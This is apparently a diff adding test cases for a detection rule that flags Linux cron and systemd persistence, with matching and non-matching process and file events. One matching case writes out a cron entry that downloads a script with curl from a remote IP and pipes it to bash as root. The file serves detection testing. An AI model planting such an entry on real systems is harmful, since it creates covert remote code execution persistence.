@@ -1,0 +1,74 @@
+rule: TH-025-linux-cron-systemd-persistence
+description: >
+  Process cases cover crontab replacement, systemctl enable of a staged unit, and a shell redirect
+  into /etc/cron.d. File cases cover the direct-write path that leaves no command line. Negatives are
+  the read-only operations and package-manager writes that dominate benign volume.
+cases:
+  - name: Cron entry written into /etc/cron.d with a curl-to-shell payload
+    expect: match
+    target: 2bb7f025-43d0-4a25-8c25-7d6a1f250025
+    event:
+      Image: '/usr/bin/bash'
+      CommandLine: "bash -c 'echo \"*/5 * * * * root curl -s http://198.51.100.60/p.sh | bash\" > /etc/cron.d/update'"
+      ParentImage: '/usr/sbin/sshd'
+      User: 'root'
+
+  - name: systemctl enable of a unit staged in tmp
+    expect: match
+    target: 2bb7f025-43d0-4a25-8c25-7d6a1f250025
+    event:
+      Image: '/usr/bin/systemctl'
+      CommandLine: 'systemctl enable /tmp/updater.service'
+      ParentImage: '/usr/bin/bash'
+      User: 'root'
+
+  - name: crontab replaced from a file
+    expect: match
+    target: 2bb7f025-43d0-4a25-8c25-7d6a1f250025
+    event:
+      Image: '/usr/bin/crontab'
+      CommandLine: 'crontab /tmp/cron.txt'
+      ParentImage: '/usr/bin/bash'
+      User: 'www-data'
+
+  - name: Listing cron entries
+    expect: no_match
+    target: 2bb7f025-43d0-4a25-8c25-7d6a1f250025
+    event:
+      Image: '/usr/bin/crontab'
+      CommandLine: 'crontab -l'
+      ParentImage: '/usr/bin/bash'
+      User: 'root'
+
+  - name: Package manager enabling a service during install
+    expect: no_match
+    target: 2bb7f025-43d0-4a25-8c25-7d6a1f250025
+    event:
+      Image: '/usr/bin/systemctl'
+      CommandLine: 'systemctl enable nginx.service'
+      ParentImage: '/usr/bin/dpkg'
+      User: 'root'
+
+  - name: Unit file written directly into /etc/systemd/system
+    expect: match
+    target: 2bb7f125-43d0-4b25-8d25-7d6a1f250125
+    event:
+      TargetFilename: '/etc/systemd/system/sysupdate.service'
+      Image: '/usr/bin/python3'
+      User: 'root'
+
+  - name: User-level unit written under a home directory
+    expect: match
+    target: 2bb7f125-43d0-4b25-8d25-7d6a1f250125
+    event:
+      TargetFilename: '/home/appuser/.config/systemd/user/sync.service'
+      Image: '/usr/bin/bash'
+      User: 'appuser'
+
+  - name: Package manager installing a unit file
+    expect: no_match
+    target: 2bb7f125-43d0-4b25-8d25-7d6a1f250125
+    event:
+      TargetFilename: '/lib/systemd/system/nginx.service'
+      Image: '/usr/bin/dpkg'
+      User: 'root'
